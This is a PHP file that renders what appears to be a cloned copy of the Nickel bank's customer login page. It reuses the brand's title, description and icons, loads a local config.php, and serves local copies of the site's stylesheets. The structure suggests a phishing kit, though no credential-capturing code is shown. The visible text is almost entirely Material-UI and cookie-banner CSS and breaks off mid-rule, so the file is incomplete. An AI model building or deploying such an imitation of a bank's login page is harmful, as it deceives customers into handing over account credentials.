<?php

require("../config.php");

?>
<html lang="fr-FR">

<head>
    <meta charset="utf-8">
    <title>Espace client : Gérer son compte | Nickel</title>
    <meta name="description" content="Page d'identification pour se connecter à l'espace client Nickel. Jamais gérer son compte bancaire n'a été aussi simple !">
    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no,maximum-scale=1,user-scalable=0">
    <meta name="robots" content="">
    <meta name="theme-color" content="#FF5F00">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <link rel="apple-touch-icon" sizes="180x180" href="https://app.nickel.eu//assets/icon-180.png">
    <link rel="apple-touch-icon" sizes="167x167" href="https://app.nickel.eu//assets/icon-180.png/assets/icon-167.png">
    <link rel="apple-touch-icon" sizes="152x152" href="https://app.nickel.eu//assets/icon-180.png/assets/icon-152.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://app.nickel.eu//assets/icon-180.png/assets/icon-120.png">
    <meta itemprop="name" content="Espace client Nickel">
    <meta itemprop="description" content="Nickel | Le compte pour tous ouvert chez votre buraliste">
    <link rel="shortcut icon" href="https://app.nickel.eu/favicon.ico">
    <link href="../assets/css/86fffa26.chunk.css" rel="stylesheet">
    <link href="../assets/css/24571a40.chunk.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="../assets/css/des.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/f55d3599.chunk.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/645939e1.chunk.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/fe9185d1.chunk.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/2282daa7.chunk.css">
    <style data-jss="" data-meta="MuiGrid">
        .MuiGrid-container {
            width: 100%;
            display: flex;
            flex-wrap: wrap;
            box-sizing: border-box;
        }

        .MuiGrid-item {
            margin: 0;
            box-sizing: border-box;
        }

        .MuiGrid-zeroMinWidth {
            min-width: 0;
        }

        .MuiGrid-direction-xs-column {
            flex-direction: column;
        }

        .MuiGrid-direction-xs-column-reverse {
            flex-direction: column-reverse;
        }

        .MuiGrid-direction-xs-row-reverse {
            flex-direction: row-reverse;
        }

        .MuiGrid-wrap-xs-nowrap {
            flex-wrap: nowrap;
        }

        .MuiGrid-wrap-xs-wrap-reverse {
            flex-wrap: wrap-reverse;
        }

        .MuiGrid-align-items-xs-center {
            align-items: center;
        }

        .MuiGrid-align-items-xs-flex-start {
            align-items: flex-start;
        }

        .MuiGrid-align-items-xs-flex-end {
            align-items: flex-end;
        }

        .MuiGrid-align-items-xs-baseline {
            align-items: baseline;
        }

        .MuiGrid-align-content-xs-center {
            align-content: center;
        }

        .MuiGrid-align-content-xs-flex-start {
            align-content: flex-start;
        }

        .MuiGrid-align-content-xs-flex-end {
            align-content: flex-end;
        }

        .MuiGrid-align-content-xs-space-between {
            align-content: space-between;
        }

        .MuiGrid-align-content-xs-space-around {
            align-content: space-around;
        }

        .MuiGrid-justify-xs-center {
            justify-content: center;
        }

        .MuiGrid-justify-xs-flex-end {
            justify-content: flex-end;
        }

        .MuiGrid-justify-xs-space-between {
            justify-content: space-between;
        }

        .MuiGrid-justify-xs-space-around {
            justify-content: space-around;
        }

        .MuiGrid-justify-xs-space-evenly {
            justify-content: space-evenly;
        }

        .MuiGrid-spacing-xs-1 {
            width: calc(100% + 8px);
            margin: -4px;
        }

        .MuiGrid-spacing-xs-1>.MuiGrid-item {
            padding: 4px;
        }

        .MuiGrid-spacing-xs-2 {
            width: calc(100% + 16px);
            margin: -8px;
        }

        .MuiGrid-spacing-xs-2>.MuiGrid-item {
            padding: 8px;
        }

        .MuiGrid-spacing-xs-3 {
            width: calc(100% + 24px);
            margin: -12px;
        }

        .MuiGrid-spacing-xs-3>.MuiGrid-item {
            padding: 12px;
        }

        .MuiGrid-spacing-xs-4 {
            width: calc(100% + 32px);
            margin: -16px;
        }

        .MuiGrid-spacing-xs-4>.MuiGrid-item {
            padding: 16px;
        }

        .MuiGrid-spacing-xs-5 {
            width: calc(100% + 40px);
            margin: -20px;
        }

        .MuiGrid-spacing-xs-5>.MuiGrid-item {
            padding: 20px;
        }

        .MuiGrid-spacing-xs-6 {
            width: calc(100% + 48px);
            margin: -24px;
        }

        .MuiGrid-spacing-xs-6>.MuiGrid-item {
            padding: 24px;
        }

        .MuiGrid-spacing-xs-7 {
            width: calc(100% + 56px);
            margin: -28px;
        }

        .MuiGrid-spacing-xs-7>.MuiGrid-item {
            padding: 28px;
        }

        .MuiGrid-spacing-xs-8 {
            width: calc(100% + 64px);
            margin: -32px;
        }

        .MuiGrid-spacing-xs-8>.MuiGrid-item {
            padding: 32px;
        }

        .MuiGrid-spacing-xs-9 {
            width: calc(100% + 72px);
            margin: -36px;
        }

        .MuiGrid-spacing-xs-9>.MuiGrid-item {
            padding: 36px;
        }

        .MuiGrid-spacing-xs-10 {
            width: calc(100% + 80px);
            margin: -40px;
        }

        .MuiGrid-spacing-xs-10>.MuiGrid-item {
            padding: 40px;
        }

        .MuiGrid-grid-xs-auto {
            flex-grow: 0;
            max-width: none;
            flex-basis: auto;
        }

        .MuiGrid-grid-xs-true {
            flex-grow: 1;
            max-width: 100%;
            flex-basis: 0;
        }

        .MuiGrid-grid-xs-1 {
            flex-grow: 0;
            max-width: 8.333333%;
            flex-basis: 8.333333%;
        }

        .MuiGrid-grid-xs-2 {
            flex-grow: 0;
            max-width: 16.666667%;
            flex-basis: 16.666667%;
        }

        .MuiGrid-grid-xs-3 {
            flex-grow: 0;
            max-width: 25%;
            flex-basis: 25%;
        }

        .MuiGrid-grid-xs-4 {
            flex-grow: 0;
            max-width: 33.333333%;
            flex-basis: 33.333333%;
        }

        .MuiGrid-grid-xs-5 {
            flex-grow: 0;
            max-width: 41.666667%;
            flex-basis: 41.666667%;
        }

        .MuiGrid-grid-xs-6 {
            flex-grow: 0;
            max-width: 50%;
            flex-basis: 50%;
        }

        .MuiGrid-grid-xs-7 {
            flex-grow: 0;
            max-width: 58.333333%;
            flex-basis: 58.333333%;
        }

        .MuiGrid-grid-xs-8 {
            flex-grow: 0;
            max-width: 66.666667%;
            flex-basis: 66.666667%;
        }

        .MuiGrid-grid-xs-9 {
            flex-grow: 0;
            max-width: 75%;
            flex-basis: 75%;
        }

        .MuiGrid-grid-xs-10 {
            flex-grow: 0;
            max-width: 83.333333%;
            flex-basis: 83.333333%;
        }

        .MuiGrid-grid-xs-11 {
            flex-grow: 0;
            max-width: 91.666667%;
            flex-basis: 91.666667%;
        }

        .MuiGrid-grid-xs-12 {
            flex-grow: 0;
            max-width: 100%;
            flex-basis: 100%;
        }

        @media (min-width:576px) {
            .MuiGrid-grid-sm-auto {
                flex-grow: 0;
                max-width: none;
                flex-basis: auto;
            }

            .MuiGrid-grid-sm-true {
                flex-grow: 1;
                max-width: 100%;
                flex-basis: 0;
            }

            .MuiGrid-grid-sm-1 {
                flex-grow: 0;
                max-width: 8.333333%;
                flex-basis: 8.333333%;
            }

            .MuiGrid-grid-sm-2 {
                flex-grow: 0;
                max-width: 16.666667%;
                flex-basis: 16.666667%;
            }

            .MuiGrid-grid-sm-3 {
                flex-grow: 0;
                max-width: 25%;
                flex-basis: 25%;
            }

            .MuiGrid-grid-sm-4 {
                flex-grow: 0;
                max-width: 33.333333%;
                flex-basis: 33.333333%;
            }

            .MuiGrid-grid-sm-5 {
                flex-grow: 0;
                max-width: 41.666667%;
                flex-basis: 41.666667%;
            }

            .MuiGrid-grid-sm-6 {
                flex-grow: 0;
                max-width: 50%;
                flex-basis: 50%;
            }

            .MuiGrid-grid-sm-7 {
                flex-grow: 0;
                max-width: 58.333333%;
                flex-basis: 58.333333%;
            }

            .MuiGrid-grid-sm-8 {
                flex-grow: 0;
                max-width: 66.666667%;
                flex-basis: 66.666667%;
            }

            .MuiGrid-grid-sm-9 {
                flex-grow: 0;
                max-width: 75%;
                flex-basis: 75%;
            }

            .MuiGrid-grid-sm-10 {
                flex-grow: 0;
                max-width: 83.333333%;
                flex-basis: 83.333333%;
            }

            .MuiGrid-grid-sm-11 {
                flex-grow: 0;
                max-width: 91.666667%;
                flex-basis: 91.666667%;
            }

            .MuiGrid-grid-sm-12 {
                flex-grow: 0;
                max-width: 100%;
                flex-basis: 100%;
            }
        }

        @media (min-width:768px) {
            .MuiGrid-grid-md-auto {
                flex-grow: 0;
                max-width: none;
                flex-basis: auto;
            }

            .MuiGrid-grid-md-true {
                flex-grow: 1;
                max-width: 100%;
                flex-basis: 0;
            }

            .MuiGrid-grid-md-1 {
                flex-grow: 0;
                max-width: 8.333333%;
                flex-basis: 8.333333%;
            }

            .MuiGrid-grid-md-2 {
                flex-grow: 0;
                max-width: 16.666667%;
                flex-basis: 16.666667%;
            }

            .MuiGrid-grid-md-3 {
                flex-grow: 0;
                max-width: 25%;
                flex-basis: 25%;
            }

            .MuiGrid-grid-md-4 {
                flex-grow: 0;
                max-width: 33.333333%;
                flex-basis: 33.333333%;
            }

            .MuiGrid-grid-md-5 {
                flex-grow: 0;
                max-width: 41.666667%;
                flex-basis: 41.666667%;
            }

            .MuiGrid-grid-md-6 {
                flex-grow: 0;
                max-width: 50%;
                flex-basis: 50%;
            }

            .MuiGrid-grid-md-7 {
                flex-grow: 0;
                max-width: 58.333333%;
                flex-basis: 58.333333%;
            }

            .MuiGrid-grid-md-8 {
                flex-grow: 0;
                max-width: 66.666667%;
                flex-basis: 66.666667%;
            }

            .MuiGrid-grid-md-9 {
                flex-grow: 0;
                max-width: 75%;
                flex-basis: 75%;
            }

            .MuiGrid-grid-md-10 {
                flex-grow: 0;
                max-width: 83.333333%;
                flex-basis: 83.333333%;
            }

            .MuiGrid-grid-md-11 {
                flex-grow: 0;
                max-width: 91.666667%;
                flex-basis: 91.666667%;
            }

            .MuiGrid-grid-md-12 {
                flex-grow: 0;
                max-width: 100%;
                flex-basis: 100%;
            }
        }

        @media (min-width:1280px) {
            .MuiGrid-grid-lg-auto {
                flex-grow: 0;
                max-width: none;
                flex-basis: auto;
            }

            .MuiGrid-grid-lg-true {
                flex-grow: 1;
                max-width: 100%;
                flex-basis: 0;
            }

            .MuiGrid-grid-lg-1 {
                flex-grow: 0;
                max-width: 8.333333%;
                flex-basis: 8.333333%;
            }

            .MuiGrid-grid-lg-2 {
                flex-grow: 0;
                max-width: 16.666667%;
                flex-basis: 16.666667%;
            }

            .MuiGrid-grid-lg-3 {
                flex-grow: 0;
                max-width: 25%;
                flex-basis: 25%;
            }

            .MuiGrid-grid-lg-4 {
                flex-grow: 0;
                max-width: 33.333333%;
                flex-basis: 33.333333%;
            }

            .MuiGrid-grid-lg-5 {
                flex-grow: 0;
                max-width: 41.666667%;
                flex-basis: 41.666667%;
            }

            .MuiGrid-grid-lg-6 {
                flex-grow: 0;
                max-width: 50%;
                flex-basis: 50%;
            }

            .MuiGrid-grid-lg-7 {
                flex-grow: 0;
                max-width: 58.333333%;
                flex-basis: 58.333333%;
            }

            .MuiGrid-grid-lg-8 {
                flex-grow: 0;
                max-width: 66.666667%;
                flex-basis: 66.666667%;
            }

            .MuiGrid-grid-lg-9 {
                flex-grow: 0;
                max-width: 75%;
                flex-basis: 75%;
            }

            .MuiGrid-grid-lg-10 {
                flex-grow: 0;
                max-width: 83.333333%;
                flex-basis: 83.333333%;
            }

            .MuiGrid-grid-lg-11 {
                flex-grow: 0;
                max-width: 91.666667%;
                flex-basis: 91.666667%;
            }

            .MuiGrid-grid-lg-12 {
                flex-grow: 0;
                max-width: 100%;
                flex-basis: 100%;
            }
        }

        @media (min-width:1440px) {
            .MuiGrid-grid-xl-auto {
                flex-grow: 0;
                max-width: none;
                flex-basis: auto;
            }

            .MuiGrid-grid-xl-true {
                flex-grow: 1;
                max-width: 100%;
                flex-basis: 0;
            }

            .MuiGrid-grid-xl-1 {
                flex-grow: 0;
                max-width: 8.333333%;
                flex-basis: 8.333333%;
            }

            .MuiGrid-grid-xl-2 {
                flex-grow: 0;
                max-width: 16.666667%;
                flex-basis: 16.666667%;
            }

            .MuiGrid-grid-xl-3 {
                flex-grow: 0;
                max-width: 25%;
                flex-basis: 25%;
            }

            .MuiGrid-grid-xl-4 {
                flex-grow: 0;
                max-width: 33.333333%;
                flex-basis: 33.333333%;
            }

            .MuiGrid-grid-xl-5 {
                flex-grow: 0;
                max-width: 41.666667%;
                flex-basis: 41.666667%;
            }

            .MuiGrid-grid-xl-6 {
                flex-grow: 0;
                max-width: 50%;
                flex-basis: 50%;
            }

            .MuiGrid-grid-xl-7 {
                flex-grow: 0;
                max-width: 58.333333%;
                flex-basis: 58.333333%;
            }

            .MuiGrid-grid-xl-8 {
                flex-grow: 0;
                max-width: 66.666667%;
                flex-basis: 66.666667%;
            }

            .MuiGrid-grid-xl-9 {
                flex-grow: 0;
                max-width: 75%;
                flex-basis: 75%;
            }

            .MuiGrid-grid-xl-10 {
                flex-grow: 0;
                max-width: 83.333333%;
                flex-basis: 83.333333%;
            }

            .MuiGrid-grid-xl-11 {
                flex-grow: 0;
                max-width: 91.666667%;
                flex-basis: 91.666667%;
            }

            .MuiGrid-grid-xl-12 {
                flex-grow: 0;
                max-width: 100%;
                flex-basis: 100%;
            }
        }
    </style>
    <style data-jss="" data-meta="MuiTouchRipple">
        .MuiTouchRipple-root {
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            overflow: hidden;
            position: absolute;
            border-radius: inherit;
            pointer-events: none;
        }

        .MuiTouchRipple-ripple {
            opacity: 0;
            position: absolute;
        }

        .MuiTouchRipple-rippleVisible {
            opacity: 0.3;
            animation: MuiTouchRipple-keyframes-enter 550ms cubic-bezier(0.4, 0, 0.2, 1);
            transform: scale(1);
        }

        .MuiTouchRipple-ripplePulsate {
            animation-duration: 200ms;
        }

        .MuiTouchRipple-child {
            width: 100%;
            height: 100%;
            display: block;
            opacity: 1;
            border-radius: 50%;
            background-color: currentColor;
        }

        .MuiTouchRipple-childLeaving {
            opacity: 0;
            animation: MuiTouchRipple-keyframes-exit 550ms cubic-bezier(0.4, 0, 0.2, 1);
        }

        .MuiTouchRipple-childPulsate {
            top: 0;
            left: 0;
            position: absolute;
            animation: MuiTouchRipple-keyframes-pulsate 2500ms cubic-bezier(0.4, 0, 0.2, 1) 200ms infinite;
        }

        @-webkit-keyframes MuiTouchRipple-keyframes-enter {
            0% {
                opacity: 0.1;
                transform: scale(0);
            }

            100% {
                opacity: 0.3;
                transform: scale(1);
            }
        }

        @-webkit-keyframes MuiTouchRipple-keyframes-exit {
            0% {
                opacity: 1;
            }

            100% {
                opacity: 0;
            }
        }

        @-webkit-keyframes MuiTouchRipple-keyframes-pulsate {
            0% {
                transform: scale(1);
            }

            50% {
                transform: scale(0.92);
            }

            100% {
                transform: scale(1);
            }
        }
    </style>
    <style data-jss="" data-meta="MuiButtonBase">
        .MuiButtonBase-root {
            color: inherit;
            border: 0;
            cursor: pointer;
            margin: 0;
            display: inline-flex;
            outline: 0;
            padding: 0;
            position: relative;
            align-items: center;
            user-select: none;
            border-radius: 0;
            vertical-align: middle;
            -moz-appearance: none;
            justify-content: center;
            text-decoration: none;
            background-color: transparent;
            -webkit-appearance: none;
            -webkit-tap-highlight-color: transparent;
        }

        .MuiButtonBase-root::-moz-focus-inner {
            border-style: none;
        }

        .MuiButtonBase-root.Mui-disabled {
            cursor: default;
            pointer-events: none;
        }
    </style>
    <style data-jss="" data-meta="MuiIconButton">
        .MuiIconButton-root {
            flex: 0 0 auto;
            color: rgba(0, 0, 0, 0.54);
            padding: 12px;
            overflow: visible;
            font-size: 1.5rem;
            text-align: center;
            transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
            border-radius: 50%;
        }

        .MuiIconButton-root:hover {
            background-color: rgba(0, 0, 0, 0.08);
        }

        .MuiIconButton-root.Mui-disabled {
            color: rgba(0, 0, 0, 0.26);
            background-color: transparent;
        }

        @media (hover: none) {
            .MuiIconButton-root:hover {
                background-color: transparent;
            }
        }

        .MuiIconButton-edgeStart {
            margin-left: -12px;
        }

        .MuiIconButton-sizeSmall.MuiIconButton-edgeStart {
            margin-left: -3px;
        }

        .MuiIconButton-edgeEnd {
            margin-right: -12px;
        }

        .MuiIconButton-sizeSmall.MuiIconButton-edgeEnd {
            margin-right: -3px;
        }

        .MuiIconButton-colorInherit {
            color: inherit;
        }

        .MuiIconButton-colorPrimary {
            color: #3f51b5;
        }

        .MuiIconButton-colorPrimary:hover {
            background-color: rgba(63, 81, 181, 0.08);
        }

        @media (hover: none) {
            .MuiIconButton-colorPrimary:hover {
                background-color: transparent;
            }
        }

        .MuiIconButton-colorSecondary {
            color: #f50057;
        }

        .MuiIconButton-colorSecondary:hover {
            background-color: rgba(245, 0, 87, 0.08);
        }

        @media (hover: none) {
            .MuiIconButton-colorSecondary:hover {
                background-color: transparent;
            }
        }

        .MuiIconButton-sizeSmall {
            padding: 3px;
            font-size: 1.125rem;
        }

        .MuiIconButton-label {
            width: 100%;
            display: flex;
            align-items: inherit;
            justify-content: inherit;
        }
    </style>
    <style data-jss="" data-meta="PrivateSwitchBase">
        .jss116 {
            padding: 9px;
        }

        .jss119 {
            top: 0;
            left: 0;
            width: 100%;
            cursor: inherit;
            height: 100%;
            margin: 0;
            opacity: 0;
            padding: 0;
            z-index: 1;
            position: absolute;
        }
    </style>
    <style data-jss="" data-meta="MuiSvgIcon">
        .MuiSvgIcon-root {
            fill: currentColor;
            width: 1em;
            height: 1em;
            display: inline-block;
            font-size: 1.5rem;
            transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
            flex-shrink: 0;
            user-select: none;
        }

        .MuiSvgIcon-colorPrimary {
            color: #3f51b5;
        }

        .MuiSvgIcon-colorSecondary {
            color: #f50057;
        }

        .MuiSvgIcon-colorAction {
            color: rgba(0, 0, 0, 0.54);
        }

        .MuiSvgIcon-colorError {
            color: #f44336;
        }

        .MuiSvgIcon-colorDisabled {
            color: rgba(0, 0, 0, 0.26);
        }

        .MuiSvgIcon-fontSizeInherit {
            font-size: inherit;
        }

        .MuiSvgIcon-fontSizeSmall {
            font-size: 1.25rem;
        }

        .MuiSvgIcon-fontSizeLarge {
            font-size: 2.1875rem;
        }
    </style>
    <style data-jss="" data-meta="MuiCheckbox">
        .MuiCheckbox-root {
            color: rgba(0, 0, 0, 0.54);
        }

        .MuiCheckbox-colorPrimary.Mui-checked {
            color: #3f51b5;
        }

        .MuiCheckbox-colorPrimary.Mui-disabled {
            color: rgba(0, 0, 0, 0.26);
        }

        .MuiCheckbox-colorPrimary.Mui-checked:hover {
            background-color: rgba(63, 81, 181, 0.08);
        }

        @media (hover: none) {
            .MuiCheckbox-colorPrimary.Mui-checked:hover {
                background-color: transparent;
            }
        }

        .MuiCheckbox-colorSecondary.Mui-checked {
            color: #f50057;
        }

        .MuiCheckbox-colorSecondary.Mui-disabled {
            color: rgba(0, 0, 0, 0.26);
        }

        .MuiCheckbox-colorSecondary.Mui-checked:hover {
            background-color: rgba(245, 0, 87, 0.08);
        }

        @media (hover: none) {
            .MuiCheckbox-colorSecondary.Mui-checked:hover {
                background-color: transparent;
            }
        }
    </style>
    <style data-jss="" data-meta="MuiTypography">
        .MuiTypography-root {
            margin: 0;
        }

        .MuiTypography-body2 {
            font-size: 0.875rem;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-weight: 400;
            line-height: 1.43;
            letter-spacing: 0.01071em;
        }

        .MuiTypography-body1 {
            font-size: 1rem;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-weight: 400;
            line-height: 1.5;
            letter-spacing: 0.00938em;
        }

        .MuiTypography-caption {
            font-size: 0.75rem;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-weight: 400;
            line-height: 1.66;
            letter-spacing: 0.03333em;
        }

        .MuiTypography-button {
            font-size: 0.875rem;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-weight: 500;
            line-height: 1.75;
            letter-spacing: 0.02857em;
            text-transform: uppercase;
        }

        .MuiTypography-h1 {
            font-size: 6rem;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-weight: 300;
            line-height: 1;
            letter-spacing: -0.01562em;
        }

        .MuiTypography-h2 {
            font-size: 3.75rem;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-weight: 300;
            line-height: 1;
            letter-spacing: -0.00833em;
        }

        .MuiTypography-h3 {
            font-size: 3rem;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-weight: 400;
            line-height: 1.04;
            letter-spacing: 0em;
        }

        .MuiTypography-h4 {
            font-size: 2.125rem;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-weight: 400;
            line-height: 1.17;
            letter-spacing: 0.00735em;
        }

        .MuiTypography-h5 {
            font-size: 1.5rem;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-weight: 400;
            line-height: 1.33;
            letter-spacing: 0em;
        }

        .MuiTypography-h6 {
            font-size: 1.25rem;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-weight: 500;
            line-height: 1.6;
            letter-spacing: 0.0075em;
        }

        .MuiTypography-subtitle1 {
            font-size: 1rem;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-weight: 400;
            line-height: 1.75;
            letter-spacing: 0.00938em;
        }

        .MuiTypography-subtitle2 {
            font-size: 0.875rem;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-weight: 500;
            line-height: 1.57;
            letter-spacing: 0.00714em;
        }

        .MuiTypography-overline {
            font-size: 0.75rem;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-weight: 400;
            line-height: 2.66;
            letter-spacing: 0.08333em;
            text-transform: uppercase;
        }

        .MuiTypography-srOnly {
            width: 1px;
            height: 1px;
            overflow: hidden;
            position: absolute;
        }

        .MuiTypography-alignLeft {
            text-align: left;
        }

        .MuiTypography-alignCenter {
            text-align: center;
        }

        .MuiTypography-alignRight {
            text-align: right;
        }

        .MuiTypography-alignJustify {
            text-align: justify;
        }

        .MuiTypography-noWrap {
            overflow: hidden;
            white-space: nowrap;
            text-overflow: ellipsis;
        }

        .MuiTypography-gutterBottom {
            margin-bottom: 0.35em;
        }

        .MuiTypography-paragraph {
            margin-bottom: 16px;
        }

        .MuiTypography-colorInherit {
            color: inherit;
        }

        .MuiTypography-colorPrimary {
            color: #3f51b5;
        }

        .MuiTypography-colorSecondary {
            color: #f50057;
        }

        .MuiTypography-colorTextPrimary {
            color: rgba(0, 0, 0, 0.87);
        }

        .MuiTypography-colorTextSecondary {
            color: rgba(0, 0, 0, 0.54);
        }

        .MuiTypography-colorError {
            color: #f44336;
        }

        .MuiTypography-displayInline {
            display: inline;
        }

        .MuiTypography-displayBlock {
            display: block;
        }
    </style>
    <style data-jss="" data-meta="MuiFormControlLabel">
        .MuiFormControlLabel-root {
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            margin-left: -11px;
            margin-right: 16px;
            vertical-align: middle;
            -webkit-tap-highlight-color: transparent;
        }

        .MuiFormControlLabel-root.Mui-disabled {
            cursor: default;
        }

        .MuiFormControlLabel-labelPlacementStart {
            margin-left: 16px;
            margin-right: -11px;
            flex-direction: row-reverse;
        }

        .MuiFormControlLabel-labelPlacementTop {
            margin-left: 16px;
            flex-direction: column-reverse;
        }

        .MuiFormControlLabel-labelPlacementBottom {
            margin-left: 16px;
            flex-direction: column;
        }

        .MuiFormControlLabel-label.Mui-disabled {
            color: rgba(0, 0, 0, 0.38);
        }
    </style>
    <link rel="stylesheet" type="text/css" href="../assets/css/74.b7389af6.chunk.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/65.045f2d82.chunk.css">
    <style data-emotion="css"></style>
    <style id="onetrust-style">
        #onetrust-banner-sdk {
            -ms-text-size-adjust: 100%;
            -webkit-text-size-adjust: 100%
        }

        #onetrust-banner-sdk .onetrust-vendors-list-handler {
            cursor: pointer;
            color: #1f96db;
            font-size: inherit;
            font-weight: bold;
            text-decoration: none;
            margin-left: 5px
        }

        #onetrust-banner-sdk .onetrust-vendors-list-handler:hover {
            color: #1f96db
        }

        #onetrust-banner-sdk:focus {
            outline: 2px solid #000;
            outline-offset: -2px
        }

        #onetrust-banner-sdk a:focus {
            outline: 2px solid #000
        }

        #onetrust-banner-sdk .ot-close-icon,
        #onetrust-pc-sdk .ot-close-icon,
        #ot-sync-ntfy .ot-close-icon {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4IiB3aWR0aD0iMzQ4LjMzM3B4IiBoZWlnaHQ9IjM0OC4zMzNweCIgdmlld0JveD0iMCAwIDM0OC4zMzMgMzQ4LjMzNCIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzQ4LjMzMyAzNDguMzM0OyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PGc+PHBhdGggZmlsbD0iIzU2NTY1NiIgZD0iTTMzNi41NTksNjguNjExTDIzMS4wMTYsMTc0LjE2NWwxMDUuNTQzLDEwNS41NDljMTUuNjk5LDE1LjcwNSwxNS42OTksNDEuMTQ1LDAsNTYuODVjLTcuODQ0LDcuODQ0LTE4LjEyOCwxMS43NjktMjguNDA3LDExLjc2OWMtMTAuMjk2LDAtMjAuNTgxLTMuOTE5LTI4LjQxOS0xMS43NjlMMTc0LjE2NywyMzEuMDAzTDY4LjYwOSwzMzYuNTYzYy03Ljg0Myw3Ljg0NC0xOC4xMjgsMTEuNzY5LTI4LjQxNiwxMS43NjljLTEwLjI4NSwwLTIwLjU2My0zLjkxOS0yOC40MTMtMTEuNzY5Yy0xNS42OTktMTUuNjk4LTE1LjY5OS00MS4xMzksMC01Ni44NWwxMDUuNTQtMTA1LjU0OUwxMS43NzQsNjguNjExYy0xNS42OTktMTUuNjk5LTE1LjY5OS00MS4xNDUsMC01Ni44NDRjMTUuNjk2LTE1LjY4Nyw0MS4xMjctMTUuNjg3LDU2LjgyOSwwbDEwNS41NjMsMTA1LjU1NEwyNzkuNzIxLDExLjc2N2MxNS43MDUtMTUuNjg3LDQxLjEzOS0xNS42ODcsNTYuODMyLDBDMzUyLjI1OCwyNy40NjYsMzUyLjI1OCw1Mi45MTIsMzM2LjU1OSw2OC42MTF6Ii8+PC9nPjwvc3ZnPg==");
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            height: 12px;
            width: 12px
        }

        #onetrust-banner-sdk .powered-by-logo,
        #onetrust-banner-sdk .ot-pc-footer-logo a,
        #onetrust-pc-sdk .powered-by-logo,
        #onetrust-pc-sdk .ot-pc-footer-logo a,
        #ot-sync-ntfy .powered-by-logo,
        #ot-sync-ntfy .ot-pc-footer-logo a {
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            height: 25px;
            width: 152px;
            display: block
        }

        #onetrust-banner-sdk h3 *,
        #onetrust-banner-sdk h4 *,
        #onetrust-banner-sdk h6 *,
        #onetrust-banner-sdk button *,
        #onetrust-banner-sdk a[data-parent-id] *,
        #onetrust-pc-sdk h3 *,
        #onetrust-pc-sdk h4 *,
        #onetrust-pc-sdk h6 *,
        #onetrust-pc-sdk button *,
        #onetrust-pc-sdk a[data-parent-id] *,
        #ot-sync-ntfy h3 *,
        #ot-sync-ntfy h4 *,
        #ot-sync-ntfy h6 *,
        #ot-sync-ntfy button *,
        #ot-sync-ntfy a[data-parent-id] * {
            font-size: inherit;
            font-weight: inherit;
            color: inherit
        }

        #onetrust-banner-sdk .ot-hide,
        #onetrust-pc-sdk .ot-hide,
        #ot-sync-ntfy .ot-hide {
            display: none !important
        }

        #onetrust-pc-sdk .ot-sdk-row .ot-sdk-column {
            padding: 0
        }

        #onetrust-pc-sdk .ot-sdk-container {
            padding-right: 0
        }

        #onetrust-pc-sdk .ot-sdk-row {
            flex-direction: initial;
            width: 100%
        }

        #onetrust-pc-sdk [type="checkbox"]:checked,
        #onetrust-pc-sdk [type="checkbox"]:not(:checked) {
            pointer-events: initial
        }

        #onetrust-pc-sdk [type="checkbox"]:disabled+label::before,
        #onetrust-pc-sdk [type="checkbox"]:disabled+label:after,
        #onetrust-pc-sdk [type="checkbox"]:disabled+label {
            pointer-events: none;
            opacity: 0.7
        }

        #onetrust-pc-sdk #vendor-list-content {
            transform: translate3d(0, 0, 0)
        }

        #onetrust-pc-sdk li input[type="checkbox"] {
            z-index: 1
        }

        #onetrust-pc-sdk li .ot-checkbox label {
            z-index: 2
        }

        #onetrust-pc-sdk li .ot-checkbox input[type="checkbox"] {
            height: auto;
            width: auto
        }

        #onetrust-pc-sdk li .host-title a,
        #onetrust-pc-sdk li .ot-host-name a,
        #onetrust-pc-sdk li .accordion-text,
        #onetrust-pc-sdk li .ot-acc-txt {
            z-index: 2;
            position: relative
        }

        #onetrust-pc-sdk input {
            margin: 3px 0.1ex
        }

        #onetrust-pc-sdk .toggle-always-active {
            opacity: 0.6;
            cursor: default
        }

        #onetrust-pc-sdk .pc-logo,
        #onetrust-pc-sdk .ot-pc-logo {
            height: 60px;
            width: 180px;
            background-position: center;
            background-size: contain;
            background-repeat: no-repeat
        }

        #onetrust-pc-sdk .ot-tooltip .ot-tooltiptext {
            visibility: hidden;
            width: 120px;
            background-color: #555;
            color: #fff;
            text-align: center;
            padding: 5px 0;
            border-radius: 6px;
            position: absolute;
            z-index: 1;
            bottom: 125%;
            left: 50%;
            margin-left: -60px;
            opacity: 0;
            transition: opacity 0.3s
        }

        #onetrust-pc-sdk .ot-tooltip .ot-tooltiptext::after {
            content: "";
            position: absolute;
            top: 100%;
            left: 50%;
